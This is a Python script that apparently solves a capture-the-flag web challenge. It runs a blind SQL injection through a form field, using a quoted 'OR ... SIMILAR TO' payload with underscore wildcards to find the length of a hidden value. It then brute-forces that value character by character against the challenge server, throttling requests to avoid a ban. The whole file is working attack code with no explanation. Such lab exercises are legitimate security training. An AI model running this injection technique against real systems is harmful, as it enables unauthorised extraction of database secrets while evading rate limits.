from urllib.parse import urlencode
from urllib.request import urlopen
import webbrowser
import tempfile
import time
import urllib.request
import urllib.error
import string


def replace_c(old_s, i, new_c):
    tmp_list = list(old_s)
    tmp_list[i] = new_c
    new_s = ''.join(tmp_list)
    return new_s

name = "Kelsey"
query1 = "prova' OR gnome_name SIMILAR TO '"
lnt = 0

characters = string.ascii_letters + string.digits

print("skill issue is starting.....")
for i in range (1,50):  
    query1 = query1 + '_'
    data = {
        "assigned_name": name,
        "gnome_name": query1
    }
    encoded_data = urlencode(data).encode('utf-8')
    response = urlopen("https://web7.chall.necst.it/submit", encoded_data)
    response_data = response.read()
    #print(i)
    if "Wow, you found the secret gnome!" in str(response_data):
        lnt = i
        print ("skill 1 acquired, secret has length of", lnt)
        break


i = 33

while (i<len(query1)):
    for c in characters:
        query1 = replace_c(query1, i, c)
        data = {
            "assigned_name": name,
            "gnome_name": query1
        }
        encoded_data = urlencode(data).encode('utf-8')
        response = urlopen("https://web7.chall.necst.it/submit", encoded_data)
        response_data = response.read()
        #print(c)
        if "Wow, you found the secret gnome!" in str(response_data):
            #lnt = i
            print(query1)
            break
        time.sleep(0.03) #avoid ban
    i+=1
print(lnt)
query1 = query1[(len(query1)-lnt):len(query1)]
print("!not skill issue, the gnome is: ",query1)

data = {
    "assigned_name": name,
    "gnome_name": query1
}
encoded_data = urlencode(data).encode('utf-8')
response = urlopen("https://web7.chall.necst.it/submit", encoded_data)
response_data = response.read()
with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as temp_file:
        temp_file.write(response_data)
        temp_file.flush()

webbrowser.open(f'file://{temp_file.name}')
